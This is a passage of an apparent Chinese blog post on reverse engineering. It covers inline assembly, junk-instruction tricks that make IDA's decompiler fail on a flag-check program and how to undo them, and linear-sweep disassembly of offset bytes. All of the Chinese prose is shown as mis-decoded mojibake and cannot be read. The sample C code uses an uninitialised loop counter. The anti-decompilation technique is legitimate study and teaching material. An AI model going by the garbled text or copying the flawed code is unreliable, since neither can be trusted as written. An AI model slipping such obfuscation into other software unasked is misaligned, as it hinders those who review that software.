<li>æŒ‡ä»¤åºåˆ—ï¼šä¸»è¦çš„æ±‡ç¼–æŒ‡ä»¤å†…å®¹ï¼Œå…¶åŸºæœ¬çš„ç¼–å†™è§„åˆ™ï¼š<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">è§„åˆ™1:ä»»æ„ä¸¤æ¡æŒ‡ä»¤ä¹‹é—´è¦ä¹ˆè¢«åˆ†å·(;)æˆ–æ¢è¡Œç¬¦(\n)æˆ–(\n\t)åˆ†éš”å¼€,è¦ä¹ˆå•ç‹¬æ”¾åœ¨ä¸¤è¡Œ;</span><br><span class="line">è§„åˆ™2:å•ç‹¬æ”¾åœ¨ä¸¤è¡Œçš„æ–¹æ³•æ—¢å¯ä»¥é€šè¿‡\næˆ–\n\tçš„æ–¹æ³•æ¥å®ç°,ä¹Ÿå¯ä»¥çœŸæ­£åœ°æ”¾åœ¨ä¸¤è¡Œ;</span><br><span class="line">è§„åˆ™3:å¯ä»¥ä½¿ç”¨1å¯¹æˆ–å¤šå¯¹åŒå¼•å·,æ¯1å¯¹åŒå¼•å·é‡Œé¢å¯ä»¥æ”¾1æ¡æˆ–å¤šæ¡æŒ‡ä»¤,æ‰€æœ‰çš„æŒ‡ä»¤éƒ½è¦æ”¾åœ¨åŒå¼•å·ä¸­;</span><br><span class="line">æ¯”è¾ƒç®€å•çš„å†™æ³•ï¼š</span><br><span class="line">__asm__(&quot;movl $1,%eax\n\t&quot;\</span><br><span class="line">        &quot;xor %ebx,%ebx\n\t&quot;\</span><br><span class="line">        &quot;int $0x80&quot;);</span><br></pre></td></tr></table></figure></div>
å†…è”æ±‡ç¼–è¿˜æœ‰å¾ˆå¤šçŸ¥è¯†ç‚¹ï¼Œè¿™é‡Œæš‚æ—¶ä¸æ¶‰åŠã€‚<br>PS: å…³äº ASM å®çš„æºä»£ç å¯ä»¥åœ¨<a class="link"   href="https://code.woboq.org/linux/linux/arch/x86/include/asm/asm.h.html" >è¿™é‡Œ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>æ‰¾åˆ°ã€‚</li>
</ol>
<h2 id="å-åç¼–è¯‘"><a href="#å-åç¼–è¯‘" class="headerlink" title="å-åç¼–è¯‘"></a>å-åç¼–è¯‘</h2><p>æœ€è¿‘çœ‹é›ªå­¦é™¢(å…¬ä¼—å·)å‘äº†ä¸€ç¯‡å…³äºå-åç¼–è¯‘çš„æ–‡ç« (ç¿»è¯‘è‡ª <strong>Static Analysis of Artefacts Handbook</strong>)ï¼Œçœ‹å®Œæ„Ÿè§‰å—ç›ŠåŒªæµ…ï¼Œç”±äºä¸€ç›´ä»¥æ¥åç¼–è¯‘éƒ½æ˜¯æˆ‘åˆ†æè½¯ä»¶å¿…é¡»è¦ä½¿ç”¨çš„ï¼Œæ‹¿æ¥ä¸€ä¸ªè½¯ä»¶ï¼Œé¦–å…ˆåšçš„å°±æ˜¯æ‹–è¿› IDA æŒ‰ä¸‹ F5 ï¼Œå¤§ä½¬ä»¬éƒ½è¯´ä¸è¦ä¾èµ– F5 ï¼Œå› ä¸ºæ—©æ™šä¼šç¢°åˆ°F5æ²¡æ³•ç”¨çš„æ—¶å€™ï¼Œçœ‹è¿‡è¿™ç¯‡æ–‡ç« ï¼Œæ‰çœŸæ­£æ„Ÿè§‰åˆ°è¿™é‡Œé¢çš„å¥—è·¯ä¹‹æ·± ORZâ€¦ç¨å¾®æ€»ç»“ä¸€ä¸‹å­¦åˆ°çš„ä¸œè¥¿ã€‚</p>
<p>ä»€ä¹ˆæ˜¯åç¼–è¯‘å°±ä¸ç”¨å¤šè¯´äº†ï¼Œ IDA çš„æ ¸å¿ƒåŠŸèƒ½ F5 å°±æ˜¯ä¸€ä¸ªåç¼–è¯‘å™¨ï¼Œå®ƒèƒ½å¤Ÿå°†æ±‡ç¼–ä»£ç è½¬æ¢æˆä¼ª C ä»£ç ï¼Œæå¤§åœ°æé«˜äº†é€†å‘å·¥ä½œè€…çš„å·¥ä½œæ•ˆç‡ï¼Œåç¼–è¯‘å™¨è¿˜æœ‰å¾ˆå¤šï¼ŒåŒ…æ‹¬å¼€æºçš„ RETDECã€JEBã€Reflectorç­‰ç­‰ã€‚<br>JAVA ä»¥åŠ Python ç­‰è¯­è¨€çš„åç¼–è¯‘æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯ C å’Œ C++ ç­‰è¯­è¨€åç¼–è¯‘èµ·æ¥å°±æ¯”è¾ƒå›°éš¾äº†ï¼Œè¿™æ˜¯ç”±è¯­è¨€ç‰¹æ€§å’Œç¼–è¯‘å™¨æ‰€å†³å®šçš„ï¼Œä¾‹å¦‚å‡ ä¹æ— æ³•ä» RUST çš„åç¼–è¯‘ç»“æœä¸­æå–åˆ°æœ‰ç”¨çš„ä¿¡æ¯ã€‚<br>è½¯ä»¶çš„å¼€å‘è€…è‡ªç„¶ä¸å¸Œæœ›è‡ªå·±çš„åŠ³åŠ¨æˆæœè½»æ˜“çš„å°±å¯ä»¥è¢«åˆ«äººåˆ†æå‰½çªƒï¼Œæ‰€ä»¥é’ˆå¯¹åç¼–è¯‘æŠ€æœ¯å°±å‡ºç°äº†å-åç¼–è¯‘æŠ€æœ¯ã€‚é€šè¿‡å-åç¼–è¯‘æŠ€æœ¯ï¼Œå¼€å‘è€…å¯ä»¥ä½¿é€†å‘äººå‘˜çš„å·¥ä½œé‡æå‡ï¼Œç»“åˆåŠ å£³å’Œä»£ç æ··æ·†æŠ€æœ¯ï¼Œèƒ½å¤Ÿè½¯ä»¶æ›´åŠ å®‰å…¨(<strong>ä½†æ˜¯ä¸€åˆ‡è½¯ä»¶éƒ½æ˜¯å¯ä»¥è¢«ç ´è§£çš„ï¼Œåªæ˜¯æ—¶é—´é—®é¢˜ï¼Œå¦‚æœæŸç§ä¿æŠ¤æ‰‹æ®µèƒ½å¤Ÿä½¿è½¯ä»¶åœ¨å®ƒçš„ç”Ÿå‘½å‘¨æœŸé‡Œä¸è¢«ç ´è§£ï¼Œé‚£ä¹ˆè¿™ç§æ‰‹æ®µå°±æ˜¯æˆåŠŸçš„</strong>)ã€‚<br>ç®€è¿° IDA çš„åç¼–è¯‘ï¼šç›®å‰æœ€å¸¸ç”¨çš„åç¼–è¯‘å™¨å°±æ˜¯Hex-ray decompileräº†ï¼Œæ‰€ä»¥ä»¥å®ƒä¸ºä¾‹ï¼Œåç¼–è¯‘çš„æ€æƒ³å’Œè®¾è®¡çš„æŠ€æœ¯éå¸¸å¤æ‚ï¼Œæ¶µç›–äº†å¾ˆå¤šçš„çŸ¥è¯†ï¼Œä½†æ˜¯å¯ä»¥ç®€å•çš„ç†è§£ä¸€ä¸‹ï¼ŒIDA åœ¨åç¼–è¯‘ç¨‹åºçš„æ—¶å€™ç»´æŠ¤äº†ä¸€ä¸ªè™šæ‹Ÿçš„æ ˆ(æ¨¡æ‹Ÿè¿è¡Œç¨‹åºï¼Ÿ)ï¼Œé€šè¿‡è§£æç¨‹åºçš„é€»è¾‘æµç¨‹(é¡ºåºã€åˆ†æ”¯ã€å¾ªç¯å½¢æˆ CFG)ï¼Œå°†æ±‡ç¼–ä»£ç è¿›è¡Œå¤æ‚çš„è½¬åŒ–ï¼Œæœ€åä¸ºå˜é‡åˆ†é…åå­—å’Œå¯„å­˜å™¨ï¼Œä¼˜åŒ–å‡ºä¼ªä»£ç ï¼Œå-åç¼–è¯‘å°±æ˜¯è¦é’ˆå¯¹åç¼–è¯‘çš„æµç¨‹ï¼Œæ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„å¼±ç‚¹ã€‚</p>
<p>å®é™…ä¸Šï¼Œè¿™äº›é¢å¤–çš„åƒåœ¾ä»£ç é€šå¸¸ç§°ä¸º <strong>èŠ±æŒ‡ä»¤</strong>ã€‚</p>
<p><strong>ç ´åæ ˆå¸§</strong><br>ç”±äº IDA åœ¨åç¼–è¯‘çš„æ—¶å€™ç»´æŠ¤äº†ä¸€ä¸ªæ ˆï¼Œåœ¨è§£æåˆ°è¯¸å¦‚ PUSH POP ç­‰å¯¹æ ˆçš„å¤§å°è¿›è¡Œæ“ä½œçš„æŒ‡ä»¤æ—¶ï¼Œä¼šæ¨¡æ‹Ÿè¿™äº›æ“ä½œï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œæ— è®ºè°ƒç”¨äº†å“ªäº›å‡½æ•°ï¼Œå‡½æ•°çš„æ ˆå¸§ä¸€å®šæ˜¯å¹³è¡¡çš„ï¼Œå³æ— è®ºæ ˆè¢«æŠ¬å‡å¤šå°‘ï¼Œåœ¨å‡½æ•°è¿”å›æ—¶ï¼Œä¸€å®šä¼šå°†æ ˆè¿›è¡Œæ¢å¤ã€‚<br>å½“ IDA æ£€æµ‹åˆ°æŸä¸€ä¸ªå‡½æ•°çš„æ ˆå¸§ä¸å¹³è¡¡æ—¶ï¼Œå°±ä¼šæ‹’ç»åç¼–è¯‘è¿™ä¸ªå‡½æ•°(å› ä¸ºæ— æ³•ç¡®å®šå¿…è¦çš„å˜é‡å’Œåœ°å€ç­‰)ï¼Œå¹¶ä¸”æŠ¥å‡º sp-analysis-fail(æ ˆæŒ‡é’ˆåˆ†æå¤±è´¥)ï¼Œç›¸ä¿¡è¿™ä¸ªé”™è¯¯æˆ‘ä»¬ç»å¸¸çœ‹åˆ°ï¼Œé€šå¸¸å°±æ˜¯æ±‡ç¼–ä»£ç ä¸­æŸå¤„æ“ä½œäº†æ ˆ(æˆ–è€… IDA è®¤ä¸ºæ“ä½œäº†æ ˆ)è€Œæ²¡æœ‰æ¢å¤ï¼Œå¯¼è‡´æ ˆå¸§ä¸å¹³è¡¡ã€‚<br>ä¸€äº›æƒ…å†µä¸‹ï¼Œè¿™æ˜¯ç¼–è¯‘å™¨çš„ä¼˜åŒ–é—®é¢˜ï¼Œæˆ–è€…æ˜¯ IDA è‡ªèº«çš„è§£æé—®é¢˜ï¼Œä½†æ˜¯æ›´å¤šçš„æƒ…å†µä¸‹ï¼Œè¿™æ˜¯è½¯ä»¶çš„å¼€å‘è€…åˆ¶ä½œçš„é™·é˜±ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¸€ä¸ªå°ç¨‹åºï¼š  </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc test.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> * flag = <span class="string">&quot;flag&#123;de-decompiler_smash_stack&#125;&quot;</span>;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input the flag:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, input);</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(input[i] != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        i++;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(len != <span class="number">31</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag[i] != input[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SUCCESS!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>ç¼–è¯‘åä½¿ç”¨ IDA æ‰“å¼€ï¼Œç›´æ¥åœ¨ä¸»å‡½æ•°æŒ‰ä¸‹ F5 ï¼Œå¾—åˆ°çš„ä»£ç ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, v7);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v7[v4] )</span><br><span class="line">  &#123;</span><br><span class="line">    ++v4;</span><br><span class="line">    ++v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6 == <span class="number">31</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">31</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( aFlagDeDecompil[i] != v7[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;SUCCESS!&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥çœ‹åˆ°å·²ç»éå¸¸æ¥è¿‘æºä»£ç äº†(ä¸å¾—ä¸è¯´ IDA çš„åç¼–è¯‘éå¸¸å¼º)ï¼Œè½»æ˜“å°±å¯ä»¥æ‰¾åˆ° flagã€‚<br>ä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨æºä»£ç é‡ŒåŠ å…¥ä¸€å°æ®µæ±‡ç¼–ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc test.c -o test -masm=intel</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> * flag = <span class="string">&quot;flag&#123;de-decompiler_smash_stack&#125;&quot;</span>;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input the flag:\n&quot;</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;push rax\n\t&quot;</span></span><br><span class="line">         <span class="string">&quot;xor rax,rax\n\t&quot;</span></span><br><span class="line">         <span class="string">&quot;jz lable_001\n\t&quot;</span></span><br><span class="line">         <span class="string">&quot;add esp, 4\n\t&quot;</span></span><br><span class="line">         <span class="string">&quot;lable_001:\n\t&quot;</span></span><br><span class="line">         <span class="string">&quot;pop rax&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, input);</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(input[i] != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        i++;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(len != <span class="number">31</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag[i] != input[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SUCCESS!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>åœ¨ printf å‡½æ•°ä¸‹æ–¹åŠ å…¥äº†ä¸€å°æ®µæ±‡ç¼–ä»£ç ï¼Œè¿™æ—¶ä½¿ç”¨ IDA æ‰“å¼€ç¨‹åºï¼Œå®šä½åˆ°ä¸»å‡½æ•°æŒ‰ä¸‹ F5ï¼Œä½ ä¼šå‘ç°IDAæŠ¥é”™ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler1.png"
                      alt="image"
                ><br>æç¤ºæ ˆæŒ‡é’ˆåˆ†æå¤±è´¥ï¼Œé‚£ä¹ˆæ’å…¥çš„çŸ­çŸ­å‡ è¡Œä»£ç ç©¶ç«Ÿåšäº†ä»€ä¹ˆï¼Œè®© IDA çš„ F5 å¤±æ•ˆäº†ï¼Ÿ<br>åˆ†ææ±‡ç¼–ä»£ç ä¸éš¾å‘ç°ï¼Œæ‰§è¡Œé€»è¾‘æ˜¯å…ˆå°† RAX å…¥æ ˆï¼Œç„¶åæ¸…ç©º RAXï¼Œæ³¨æ„è¿™æ—¶ ZF ä¼šè¢«ç½®ä¸º 1ï¼Œç„¶åæ¥åˆ°ä¸€æ¡è·³è½¬(jz)ï¼Œåªè¦ ZF ä¸º 1 åˆ™è·³è½¬ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±ä¼šè·³è¿‡ add esp 4 è¿™æ¡æŒ‡ä»¤ï¼Œå°† RAX æ¢å¤ç„¶åç»§ç»­æ­£å¸¸æµç¨‹ã€‚<br>ESP (RSP)æ˜¯æ ˆé¡¶æŒ‡é’ˆå¯„å­˜å™¨ï¼Œå®ƒä¿å­˜äº†å½“å‰çš„æ ˆé¡¶åœ°å€ï¼ŒIDA åœ¨è§£ææ‰§è¡Œæµæ—¶å¹¶ä¸çŸ¥é“è¿™é‡Œçš„è·³è½¬(jz)æ˜¯å¦ä¼šå¾—åˆ°æ‰§è¡Œï¼Œäºæ˜¯ IDA ä¼šå…ˆå°†æ‰€æœ‰æŒ‡ä»¤éƒ½è§†ä¸ºèƒ½å¤Ÿæ‰§è¡Œï¼ŒESPå°±ä¼šå¢åŠ  4 ï¼Œä½†æ˜¯åœ¨ä»£ç æœ«å°¾å¹¶æ²¡æœ‰æ¢å¤ ESP çš„å€¼ï¼Œå¯¼è‡´äº†æ ˆå¸§ä¸å¹³è¡¡ï¼Œ IDA æ‹’ç»åç¼–è¯‘è¿™ä¸ªå‡½æ•°ã€‚<br>åˆ†ææ¸…æ¥šäº†åŸå› ï¼Œé‚£ä¹ˆè§£å†³åŠæ³•å¾ˆç®€å•ï¼Œæˆ‘ä»¬å°† add esp 4 è¿™æ¡æŒ‡ä»¤ nop æ‰ï¼ŒIDA æ ˆå¸§å°±ä¸ä¼šè¢«ç ´åï¼Œåç¼–è¯‘å°±å¯ä»¥æ­£å¸¸è¿›è¡Œã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler2.png"
                      alt="image"
                ></p>
<p>åœ¨ç»§ç»­ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æ˜ç™½æœºå™¨ç å¹¶ä¸æ˜¯å¿…é¡»è¦æœ‰ä¸¥è°¨çš„æ ¼å¼æˆ–é¡ºåºæ‰èƒ½è¢«åæ±‡ç¼–æˆæ±‡ç¼–ä»£ç çš„ï¼Œä½¿ç”¨ IDA æ‰“å¼€ä¸€ä¸ªç¨‹åºå…¶ä¸­çš„ä»£ç æ˜¯æœ‰é€»è¾‘é¡ºåºå¯è¨€çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰“å¼€ä¸€ä¸ªå’Œç¨‹åºæ¯«ä¸ç›¸å…³çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ä¸€å¼ å›¾ç‰‡ã€‚ Â <br>æˆ‘æ‰¾åˆ°ä¸€å¼ å›¾ç‰‡(png)ï¼Œåœ¨ IDA ä¸­æ‰“å¼€ï¼Œéšæ„æ‰¾åˆ°ä¸€å¤„æŒ‰ä¸‹Cé”®ï¼Œå¾—åˆ°äº†ä»¥ä¸‹ä»£ç ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">seg000:000000000000004B                 out     0Ch, eax        ; DMA controller, 8237A-5.</span><br><span class="line">seg000:000000000000004B                                         ; clear byte pointer flip-flop.</span><br><span class="line">seg000:000000000000004D                 and     dh, [rax+4B0925A4h]</span><br><span class="line">seg000:0000000000000053                 push    rdx</span><br><span class="line">seg000:0000000000000054                 adc     [rsp+rdx*4-60h], eax</span><br><span class="line">seg000:0000000000000059                 or      [rdx], ch</span><br><span class="line">seg000:000000000000005B                 and     [rax], ch</span><br><span class="line">seg000:000000000000005D                 sub     ah, [rdx]</span><br><span class="line">seg000:000000000000005F                 push    rcx</span><br><span class="line">seg000:0000000000000060</span><br><span class="line">seg000:0000000000000060 loc_60:                                 ; CODE XREF: seg000:000000000000007Aâ†“j</span><br><span class="line">seg000:0000000000000060                 db      45h</span><br><span class="line">seg000:0000000000000060                 add     cs:0FFFFFFFF8A0310A9h, r10d</span><br><span class="line">seg000:0000000000000068                 adc     dl, [rsp+rdx*2]</span><br><span class="line">seg000:000000000000006B                 add     al, 91h</span><br><span class="line">seg000:000000000000006E</span><br><span class="line">seg000:000000000000006E loc_6E:                                 ; CODE XREF: seg000:0000000000000078â†“j</span><br><span class="line">seg000:000000000000006E                 mov     al, ds:5006F209505E80A2h</span><br><span class="line">seg000:0000000000000077                 out     dx, eax</span><br><span class="line">seg000:0000000000000078                 jge     short near ptr loc_6E+3</span><br><span class="line">seg000:000000000000007A                 jg      short near ptr loc_60+3</span><br><span class="line">seg000:000000000000007C                 mov     ebp, 9E9CFAF3h</span><br><span class="line">seg000:0000000000000081                 stc</span><br><span class="line">seg000:0000000000000082</span><br><span class="line">seg000:0000000000000082 loc_82:                                 ; CODE XREF: seg000:00000000000000A2â†“j</span><br><span class="line">seg000:0000000000000082                 jnz     short loc_FA</span><br><span class="line">seg000:0000000000000085                 cmc</span><br><span class="line">seg000:0000000000000086                 push    rdi</span><br><span class="line">seg000:0000000000000087                 push    rbx</span><br><span class="line">seg000:0000000000000088                 fnsave  byte ptr cs:0FFFFFFFFF000BB53h</span><br><span class="line">seg000:000000000000008E                 test    al, 0F8h</span><br><span class="line">seg000:0000000000000090                 db      47h, 47h</span><br><span class="line">seg000:0000000000000090                 mov     al, ds:9939A38A8C880198h</span><br><span class="line">seg000:000000000000009C                 sbb     ecx, [rcx]</span><br><span class="line">seg000:000000000000009E                 jp      short loc_118</span><br><span class="line">seg000:00000000000000A0                 jp      short near ptr loc_A9+2</span><br><span class="line">seg000:00000000000000A2                 loop    loc_82</span><br><span class="line">seg000:00000000000000A4                 add     bl, [rax]</span><br><span class="line">seg000:00000000000000A6                 xor     [rax], ah</span><br><span class="line">seg000:00000000000000A8                 popfq</span><br><span class="line">seg000:00000000000000A9</span><br><span class="line">seg000:00000000000000A9 loc_A9:                                 ; CODE XREF: seg000:00000000000000A0â†‘j</span><br><span class="line">seg000:00000000000000A9                 xadd    dh, bh</span><br><span class="line">seg000:00000000000000AC                 xchg    eax, esp</span><br><span class="line">seg000:00000000000000AD                 fsubr   dword ptr [rax+43h]</span><br></pre></td></tr></table></figure></div>
<p>ç„¶è€Œè¿™åªæ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªELFæˆ–è€…EXEçš„å¯æ‰§è¡Œç¨‹åºï¼ŒIDAå±…ç„¶å¯ä»¥è¯†åˆ«å‡ºå¾ˆå¤šçš„æ±‡ç¼–ä»£ç ï¼Œæ˜¯ä¸æ˜¯å¾ˆæƒŠè®¶ï¼Ÿ<br>äº‹å®ä¸Šï¼Œä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶(å›¾ç‰‡æˆ–è§†é¢‘æˆ–éŸ³é¢‘ç­‰ç­‰)å…¶ä¸­è‡³å°‘æœ‰ 90% å¯ä»¥è¢«è§£ææˆä»£ç ï¼Œåªæ˜¯è¿™äº›ä»£ç æ²¡æœ‰ä»»ä½•æ„ä¹‰ç½¢äº†ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆ IDA è¿˜æ˜¯ä¼šå°†è¿™äº›ä¸ç›¸å…³çš„æœºå™¨ç è¯†åˆ«å‡ºæ¥ï¼Ÿ  </p>
<p>åæ±‡ç¼–å™¨çš„ä¸¤ç§å®ç°æ–¹å¼ï¼š</p>
<ol>
<li>çº¿æ€§æ‰«æ</li>
<li>é€’å½’ä¸‹é™</li>
</ol>
<p>åæ±‡ç¼–å™¨æ‰€é¢ä¸´äº†ä¸€ä¸ªéš¾é¢˜å°±æ˜¯å¦‚ä½•åŒºåˆ†æŒ‡ä»¤å’Œæ•°æ®ï¼Œè¿™åœ¨ x86 æŒ‡ä»¤é›†(x64) ä½“ç°çš„å°¤å…¶æ˜æ˜¾ï¼Œç”±äºæŒ‡ä»¤é•¿åº¦æ˜¯å¯å˜çš„(<strong>å­—èŠ‚æ•°ä¸åŒï¼Œå¯èƒ½æ˜¯ä¸ºäº†å‰å‘å…¼å®¹</strong>)ï¼Œæ‰€ä»¥CPUè§£ç çš„æµç¨‹å¼‚å¸¸å¤æ‚ï¼Œå¯¼è‡´åæ±‡ç¼–å·¥ä½œä¹Ÿéå¸¸å›°éš¾ã€‚<br>å…³äºçº¿æ€§æ‰«æåæ±‡ç¼–å™¨ï¼Œè¿™é‡Œå€Ÿç”¨ PDF ä¸­çš„è§£é‡Šï¼Œä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä½¿ç”¨åå…­è¿›åˆ¶æŸ¥çœ‹ï¼Œå–å…¶ä¸­çš„ä¸€å°æ®µæœºå™¨ç ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler3.png"
                      alt="image"
                ></p>
<p>å…³æ³¨å…¶ä¸­çš„é«˜äº®éƒ¨åˆ†ï¼ŒæŒ‡ä»¤å¯ä»¥åˆ†ä¸ºä¸‰å¥</p>
<ol>
<li>call 0x401a20</li>
<li>jmp 0x401349</li>
<li>mov edi,edi</li>
</ol>
<p>å¦‚æœå°†è§£ææŒ‡ä»¤çš„èµ·å§‹ä½ç½®å‘åç§»åŠ¨ä¸¤ä¸ªå­—èŠ‚ï¼Œå°±ä¼šå¾—åˆ°ä»¥ä¸‹æŒ‡ä»¤åºåˆ—ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler4.png"
                      alt="image"
                ></p>
<ol>
<li>add al,0x0</li>
<li>add cl,ch</li>
<li>pop eax</li>
<li>std</li>
<li>db 0xffï¼ˆerror insï¼‰</li>
<li>dec dword [ebx - 0x1374aa01]</li>
</ol>
<p>ä¸¤è€…è¿›è¡Œä¸€ä¸‹å¯¹æ¯”ï¼Œå˜åŒ–éå¸¸æ˜æ˜¾ï¼Œæˆ‘ä»¬å¾—åˆ°çš„æŒ‡ä»¤å®Œå…¨æ²¡æœ‰æ„ä¹‰ï¼Œè€Œé€ æˆè¿™äº›åæœçš„åŸå› åªæ˜¯è§£ææŒ‡ä»¤çš„å¼€å§‹ä½ç½®å‘åç§»åŠ¨äº†ä¸¤ä¸ªå­—èŠ‚è€Œå·²ã€‚</p>
